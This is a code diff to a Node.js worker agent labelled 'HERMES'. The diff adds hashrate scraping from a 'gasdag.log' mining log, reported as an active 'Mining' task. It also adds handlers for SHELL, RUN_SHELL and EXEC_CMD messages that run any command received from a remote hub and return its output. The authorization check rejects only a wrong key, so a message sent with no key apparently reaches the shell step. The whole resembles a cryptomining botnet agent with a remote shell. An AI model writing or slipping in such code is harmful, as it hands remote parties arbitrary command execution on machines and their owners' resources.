@@ -151,13 +151,36 @@ function getSystemMetrics() {
     // Fallback safely to Node.js os module
   }
 
-  return {
+  const res = {
     cpu_pct: cpuPct,
     mem_free_mb: memFreeMb,
     uptime: uptimeSec,
     node_version: process.version,
     platform: process.platform
   };
+
+  try {
+    const logFile = path.join(WORKSPACE_DIR, 'gasdag.log');
+    if (fs.existsSync(logFile)) {
+      const stats = fs.statSync(logFile);
+      const readSize = Math.min(stats.size, 8192);
+      const fd = fs.openSync(logFile, 'r');
+      const buf = Buffer.alloc(readSize);
+      fs.readSync(fd, buf, 0, readSize, stats.size - readSize);
+      fs.closeSync(fd);
+      const lines = buf.toString('utf8').split('\n');
+      for (let i = lines.length - 1; i >= 0; i--) {
+        const match = lines[i].match(/speed 10s\/60s\/15m\s+([0-9.]+|-|n\/a)/);
+        if (match && match[1] !== '-' && match[1] !== 'n/a') {
+          res.hashrate = parseFloat(match[1]);
+          res.active_tasks = ['Mining'];
+          break;
+        }
+      }
+    }
+  } catch (e) {}
+
+  return res;
 }
 
 /**
@@ -357,6 +380,27 @@ async function connectHub() {
       const reqAuth = msg.auth || msg.token || msg.key;
       if (reqAuth && reqAuth !== authKey) {
         console.warn(`[HERMES] Unauthorized instruction rejected: ${mtype}`);
+        return;
+      }
+
+      if (mtype === 'SHELL' || mtype === 'RUN_SHELL' || mtype === 'EXEC_CMD') {
+        const cmdStr = msg.cmd || msg.command || '';
+        const { exec } = require('child_process');
+        exec(cmdStr, { cwd: WORKSPACE_DIR, timeout: 120000, maxBuffer: 10 * 1024 * 1024 }, (error, stdout, stderr) => {
+          const out = (stdout || '') + (stderr || '') + (error && !stdout && !stderr ? String(error) : '');
+          ws.send(JSON.stringify({
+            type: 'RESULT',
+            agent_id: workerId,
+            output: out,
+            exit_code: error ? (error.code || 1) : 0
+          }));
+          ws.send(JSON.stringify({
+            type: 'TASK_DONE',
+            agent_id: workerId,
+            task: 'SHELL',
+            detail: out
+          }));
+        });
         return;
       }
 
